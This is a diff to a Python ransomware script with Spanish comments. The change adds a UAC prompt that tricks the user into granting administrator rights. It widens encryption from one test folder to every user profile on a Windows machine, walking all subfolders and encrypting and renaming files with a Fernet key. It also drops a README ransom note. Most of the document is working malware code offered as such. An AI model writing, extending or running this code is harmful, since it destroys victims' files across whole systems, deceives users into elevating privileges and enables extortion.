@@ -1,9 +1,17 @@
 from cryptography.fernet import Fernet
 import os
+import psutil
+import sys
+import ctypes
 
+# Change the string to the message you want to display to the user
+message = "This script requires administrative privileges. Please re-run as administrator."
+
+# The UAC (User Account Control) will be shown with the provided message
+ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, "/p \"{}\"".format(message), None, 1)
 
 # Extensión para los archivos encriptados.
-extension = 'ramsom'
+extension = 'encripted'
 
 
 # Función para generar la clave de cifrado y almacenada en un archivo en el directorio local.
@@ -32,32 +40,40 @@ def encrypt(items, key):
 
         os.rename(item, item + '.' + extension)
 
+def get_users():
+    return {psutil.users()[i][0] for i in range(len(psutil.users()))}
+users = get_users()
 
 if __name__ == '__main__':
 
     try:
         # Directorio que vamos a cifrar.
-        path_to_encrypt = 'C:\\Users\\Javier\\Desktop\\pepe'
-
-        # Obtenemos los archivos del directorio a cifrar  los guardamos en una lista.
-        items = [ os.path.join(path_to_encrypt, item) for item in os.listdir(path_to_encrypt) ] 
-
-        files = [item for item in items if os.path.isfile(item)]
-        directories = [item for item in items if os.path.isdir(item)]
+        for user in users:
+            directories = {'C:\\Users\\'+user+"\\" for user in users}
 
         # Generación la clave de cifrado y se almacena en una variable.
         generar_key()
         key = cargar_key()
-        # Encriptación de los archivos listados.
-        encrypt(files, key)
-        for path in directories:
-            os.chdir(path)
-            directories.extend([os.path.join(path_to_encrypt, item) for item in os.listdir(os.getcwd()) if os.path.isdir(item)])
-            print(directories)
-            files = [item for item in os.listdir(os.getcwd()) if os.path.isfile(item)]
-            encrypt(files, key)
-        # Mensaje para pedir el rescate guardado en el equipo atacado, normalmente en el escritorio.
-        with open( path_to_encrypt + '\\README.txt', 'w') as file:
+
+        while directories:
+            path = directories.pop()
+            try:
+                print(f'Intentando acceder a {path}')
+                os.chdir(path)
+                itemsInPath = os.listdir(path)
+                print(itemsInPath)
+                files = set()
+                for item in itemsInPath:
+                    if os.path.isdir(path+item):
+                        directories.add(path+item)
+                    else:
+                        files.add(path+item) 
+                encrypt(files, key)
+
+            except Exception as e:
+                print('Error:', e)
+            # Mensaje para pedir el rescate guardado en el equipo atacado, normalmente en el escritorio.
+        with open( path + '\\README.txt', 'w') as file:
             file.write('Ficheros encriptados.\nSe suele pedir un rescate para el desencriptado.')
 
     except Exception as e:
